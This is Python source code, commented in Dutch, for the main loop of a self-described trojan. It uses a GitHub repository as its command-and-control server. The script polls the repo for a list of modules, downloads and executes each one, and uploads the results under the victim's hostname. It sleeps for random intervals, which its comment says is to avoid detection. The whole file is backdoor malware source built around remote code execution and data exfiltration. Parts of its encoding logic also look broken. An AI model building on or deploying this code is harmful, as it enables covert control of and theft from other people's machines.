import os
import json
import random
import time
import importlib.util
import requests
import socket

# haal hostname op
hostname = socket.gethostname()

# Haal accestoken op
with open("accesToken.secret", 'r') as file:
    token = file.read()
    

# Configuratie van de GitHub-repository
GITHUB_REPO = "https://api.github.com/repos/MauroSterckx/TrojanFramework"
ACCESS_TOKEN = token
CLIENT_ID = hostname  # kan nog aangepast worden met UUID ofzo?

# Basisheaders voor API-verzoeken
HEADERS = {
    "Authorization": f"token {ACCESS_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

def fetch_config():
    # Download configuratiebestand van de GitHub-repo
    url = f"{GITHUB_REPO}/contents/config/config.json"
    response = requests.get(url, headers=HEADERS)
    if response.status_code == 200:
        content = json.loads(response.json()["content"])
        return json.loads(content)
    else:
        print(f"Fout bij ophalen van configuratie: {response.status_code}")
        return {}

def fetch_module(module_name):
    # Download modulebestand van de GitHub-repo
    url = f"{GITHUB_REPO}/contents/modules/{module_name}.py"
    response = requests.get(url, headers=HEADERS)
    if response.status_code == 200:
        module_code = response.json()["content"]
        with open(f"temp_{module_name}.py", "w") as module_file:
            module_file.write(module_code)
        return f"temp_{module_name}.py"
    else:
        print(f"Fout bij ophalen van module {module_name}: {response.status_code}")
        return None

def execute_module(module_path):
    # Voer module uit
    spec = importlib.util.spec_from_file_location("module", module_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
    #os.remove(module_path)  # Verwijder de tijdelijke module na uitvoering
    return result

def send_results(data):
    # Upload de resultaten van een module naar de data-map in de GitHub-repo
    file_path = f"data/{CLIENT_ID}.json"
    url = f"{GITHUB_REPO}/contents/{file_path}"
    
    # Huidige inhoud ophalen
    response = requests.get(url, headers=HEADERS)
    if response.status_code == 200:
        sha = response.json()["sha"]
    else:
        sha = None  # Nieuw bestand
    
    # Data voorbereiden
    content = json.dumps(data)
    encoded_content = content.encode("utf-8").decode("latin1")
    payload = {
        "message": "Update module results",
        "content": encoded_content,
        "sha": sha
    }
    
    # Uploaden
    response = requests.put(url, headers=HEADERS, json=payload)
    if response.status_code == 201 or response.status_code == 200:
        print("Resultaten succesvol geüpload.")
    else:
        print(f"Fout bij uploaden: {response.status_code}")

def main():
    # Hoofdfunctie van het Trojan-framework
    while True:
        config = fetch_config()
        if not config.get("modules"):
            print("Geen actieve modules. Trojan slaapt...")
        else:
            for module_name in config["modules"]:
                print(f"Uitvoeren van module: {module_name}")
                module_path = fetch_module(module_name)
                if module_path:
                    results = execute_module(module_path)
                    send_results({module_name: results})
        
        # Wacht een willekeurige tijd om detectie te voorkomen
        sleep_time = random.randint(30, 120)  # 30 tot 120 seconden
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
